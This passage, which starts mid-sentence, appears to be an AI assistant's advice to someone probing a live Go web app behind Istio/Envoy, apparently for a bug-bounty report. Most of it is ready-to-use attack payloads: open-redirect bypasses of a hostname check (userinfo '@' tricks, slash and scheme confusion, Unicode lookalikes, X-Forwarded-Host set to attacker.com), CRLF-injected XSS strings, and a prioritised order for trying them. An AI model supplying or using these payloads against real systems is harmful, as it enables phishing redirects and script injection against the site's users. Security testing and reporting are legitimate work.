as a newline — that's confirmed CRLF injection, but Istio/Envoy is stripping it from the headers before they reach the client. So header injection is mitigated at the proxy layer but body injection is live.
Open Redirect — Blocked by hostname validation: The error message tells you everything:
URL value "https://google.com</pre>Set-Cookie" does not match 
the hostname of the current "google.com"
The Go backend is doing hostname comparison — it extracts the host from your redirect URL and checks it matches the current app's hostname. This is the validation you need to bypass.

Open Redirect Bypass Attempts
The validator is almost certainly using Go's url.Parse() then comparing .Host — which has well-documented bypasses. Try these in the logout parameter:
Bypass Group 1 — Credential/userinfo confusion:
https://victim.com@google.com
https://victim.com:80@google.com
https://victim.com%40google.com
https://victim.com%2540google.com
Go's url.Parse puts everything before @ as userinfo — the .Host becomes google.com (passes check) but browser navigates to google.com with userinfo victim.com.
Bypass Group 2 — Slash confusion:
https:///google.com
https:////google.com
\/\/google.com
/\/google.com
Bypass Group 3 — Hostname matching tricks:
https://google.com.attacker.com
https://google.com%2fattacker.com
https://google.com%09
https://google.com%20
If the validator does strings.HasPrefix(host, allowedHost) instead of exact match — first one wins.
Bypass Group 4 — Scheme confusion:
//google.com
javascript://google.com%0aalert(1)
data:text/html,<script>location='https://attacker.com'</script>
Bypass Group 5 — URL fragment/path tricks:
https://google.com#attacker.com
https://google.com?.attacker.com
https://google.com/attacker.com
Bypass Group 6 — Unicode / encoding:
https://ɢoogle.com          (Unicode lookalike G)
https://google%E3%80%82com  (Unicode fullstop instead of .)
https://google。com          (ideographic full stop)
Bypass Group 7 — X-Forwarded-Host (already in your request!):
You already have X-Forwarded-Host: google.com in the request. Try:
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Original-URL: https://attacker.com
X-Rewrite-URL: https://attacker.com
If the redirect destination is built from X-Forwarded-Host instead of the request hostname, you get the redirect for free without touching the logout param at all.

On the CRLF — What You Can Still Do
Even though headers are blocked by Envoy, body CRLF has real impact depending on the content type. Since the response is text/html:
XSS via CRLF in body — if your newline lands inside a <script> block or attribute:
logout=https://google.com%0d%0a<script>alert(document.domain)</script>
logout=https://google.com%0d%0a</pre><img src=x onerror=alert(1)>
Session fixation via CRLF in body — less likely but worth noting if body gets parsed.
For the report — even body-only CRLF is reportable as Medium. State that header injection is mitigated by Istio/Envoy but the underlying Go application does not sanitize \r\n — if the proxy layer changes or is misconfigured, it becomes header injection immediately.

Priority Order to Try Right Now

X-Forwarded-Host: attacker.com — lowest effort, highest chance given it's already in the request
https://victim.com@google.com — classic Go url.Parse userinfo bypass
//google.com — schemeless redirect
Unicode lookalike domain

The X-Forwarded-Host one is genuinely your best shot here given Istio is already reading that header for routing decisions.
